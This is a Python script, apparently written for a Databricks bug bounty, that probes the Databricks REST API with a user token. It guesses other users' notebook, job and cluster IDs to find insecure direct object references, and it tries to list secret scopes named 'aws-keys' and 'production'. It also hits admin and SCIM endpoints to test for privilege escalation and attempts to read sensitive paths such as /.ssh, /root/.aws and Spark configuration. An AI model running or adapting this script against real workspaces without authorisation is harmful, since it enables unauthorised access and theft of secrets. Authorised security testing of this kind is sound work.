#!/usr/bin/env python3
"""
Databricks Bug Bounty Testing Script
Requires: pip install requests
Usage: 
  export DATABRICKS_TOKEN="your_pat_token"
  export DATABRICKS_HOST="https://community.cloud.databricks.com"
  python3 test_databricks.py
"""

import os
import sys
import json
import requests
from urllib.parse import urljoin

# Configuration
HOST = os.getenv("DATABRICKS_HOST", "https://community.cloud.databricks.com")
TOKEN = os.getenv("DATABRICKS_TOKEN", "")

def get_headers():
    return {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json"
    }

def api_get(endpoint, params=None):
    """Make GET request to Databricks API"""
    url = urljoin(HOST, f"/api/2.0/{endpoint}")
    try:
        resp = requests.get(url, headers=get_headers(), params=params, timeout=10)
        return resp.status_code, resp.json() if resp.text else {}
    except Exception as e:
        return -1, {"error": str(e)}

def api_post(endpoint, data=None):
    """Make POST request to Databricks API"""
    url = urljoin(HOST, f"/api/2.0/{endpoint}")
    try:
        resp = requests.post(url, headers=get_headers(), json=data, timeout=10)
        return resp.status_code, resp.json() if resp.text else {}
    except Exception as e:
        return -1, {"error": str(e)}

def test_idor_notebooks():
    """Test IDOR on notebook endpoints"""
    print("\n=== Testing Notebook IDOR ===")
    
    # First, list our notebooks
    status, data = api_get("workspace/list", {"path": "/"})
    print(f"List workspace: {status}")
    if status == 200 and "objects" in data:
        for obj in data["objects"][:5]:
            print(f"  - {obj.get('path')} (type: {obj.get('object_type')})")
    
    # Try sequential notebook IDs
    test_ids = [1, 100, 1000, 12345, 999999]
    for nid in test_ids:
        status, data = api_get(f"workspace/get-status", {"path": f"/notebook_{nid}"})
        if status == 200:
            print(f"[!] Found notebook with ID pattern: {nid}")
        elif status != 404:
            print(f"  ID {nid}: {status} - {data.get('error_code', '')}")

def test_idor_jobs():
    """Test IDOR on job endpoints"""
    print("\n=== Testing Job IDOR ===")
    
    # List our jobs
    status, data = api_get("jobs/list")
    print(f"List jobs: {status}")
    
    # Try to get other user's jobs by ID manipulation
    test_job_ids = [1, 100, 1000, 12345]
    for jid in test_job_ids:
        status, data = api_get(f"jobs/get", {"job_id": jid})
        if status == 200:
            print(f"[POTENTIAL IDOR] Got job {jid}: {data.get('settings', {}).get('name', 'N/A')}")
        elif status != 400:
            print(f"  Job {jid}: {status}")

def test_idor_clusters():
    """Test IDOR on cluster endpoints"""
    print("\n=== Testing Cluster IDOR ===")
    
    # List our clusters
    status, data = api_get("clusters/list")
    print(f"List clusters: {status}")
    
    # Try to get other user's clusters
    test_cluster_ids = ["0101-123456-abcde", "cluster-001", "test-cluster"]
    for cid in test_cluster_ids:
        status, data = api_get(f"clusters/get", {"cluster_id": cid})
        if status == 200:
            print(f"[POTENTIAL IDOR] Got cluster {cid}")

def test_idor_secrets():
    """Test IDOR on secrets endpoints"""
    print("\n=== Testing Secrets IDOR ===")
    
    # List our secret scopes
    status, data = api_get("secrets/scopes/list")
    print(f"List scopes: {status}")
    
    # Try common scope names
    test_scopes = ["admin", "default", "production", "test", "aws-keys"]
    for scope in test_scopes:
        status, data = api_get("secrets/list", {"scope": scope})
        if status == 200:
            print(f"[POTENTIAL IDOR] Can list secrets in scope '{scope}': {data}")
        elif status != 404:
            print(f"  Scope '{scope}': {status}")

def test_permissions_escalation():
    """Test privilege escalation vectors"""
    print("\n=== Testing Permission Escalation ===")
    
    # Try to access admin endpoints
    admin_endpoints = [
        "admin/users",
        "preview/scim/v2/Users",
        "preview/scim/v2/Groups",
        "workspace-conf",
        "token/list"
    ]
    
    for endpoint in admin_endpoints:
        status, data = api_get(endpoint)
        if status == 200:
            print(f"[!] Access to {endpoint}: SUCCESS")
        else:
            print(f"  {endpoint}: {status}")

def test_dbfs_enumeration():
    """Test DBFS for sensitive files"""
    print("\n=== Testing DBFS Enumeration ===")
    
    paths_to_check = [
        "/",
        "/tmp",
        "/FileStore",
        "/mnt",
        "/databricks",
        "/user",
        "/databricks-datasets"
    ]
    
    for path in paths_to_check:
        status, data = api_get("dbfs/list", {"path": path})
        if status == 200:
            files = data.get("files", [])
            print(f"  {path}: {len(files)} items")
            for f in files[:3]:
                print(f"    - {f.get('path')} ({f.get('file_size', 0)} bytes)")
        else:
            print(f"  {path}: {status}")

def test_sensitive_file_access():
    """Try to access potentially sensitive files"""
    print("\n=== Testing Sensitive File Access ===")
    
    sensitive_paths = [
        "/FileStore/init-scripts",
        "/tmp/custom-spark.conf",
        "/databricks/spark/conf",
        "/etc/spark/conf",
        "/.ssh",
        "/root/.aws",
        "/databricks-results"
    ]
    
    for path in sensitive_paths:
        status, data = api_get("dbfs/read", {"path": path, "length": 1000})
        if status == 200:
            print(f"[SENSITIVE] Can read: {path}")
        else:
            # Try listing
            status2, data2 = api_get("dbfs/list", {"path": path})
            if status2 == 200:
                print(f"[!] Can list: {path}")

def test_unity_catalog():
    """Test Unity Catalog for cross-tenant access"""
    print("\n=== Testing Unity Catalog ===")
    
    endpoints = [
        "unity-catalog/metastores",
        "unity-catalog/catalogs",
        "unity-catalog/schemas",
        "unity-catalog/tables"
    ]
    
    for endpoint in endpoints:
        status, data = api_get(endpoint)
        if status == 200:
            print(f"  {endpoint}: {json.dumps(data)[:100]}...")
        else:
            print(f"  {endpoint}: {status}")

def main():
    if not TOKEN:
        print("[!] No DATABRICKS_TOKEN set. Testing unauthenticated endpoints only.")
        print("    Set: export DATABRICKS_TOKEN='your_pat_token'")
        
        # Test unauthenticated endpoints
        print("\n=== Unauthenticated Tests ===")
        endpoints = ["workspace/list", "clusters/list", "jobs/list"]
        for ep in endpoints:
            status, data = api_get(ep)
            print(f"  {ep}: {status} - {data.get('error_code', 'N/A')}")
        return
    
    print(f"[*] Testing Databricks at {HOST}")
    print(f"[*] Token: {TOKEN[:10]}...")
    
    # Run all tests
    test_idor_notebooks()
    test_idor_jobs()
    test_idor_clusters()
    test_idor_secrets()
    test_permissions_escalation()
    test_dbfs_enumeration()
    test_sensitive_file_access()
    test_unity_catalog()
    
    print("\n=== Testing Complete ===")

if __name__ == "__main__":
    main()

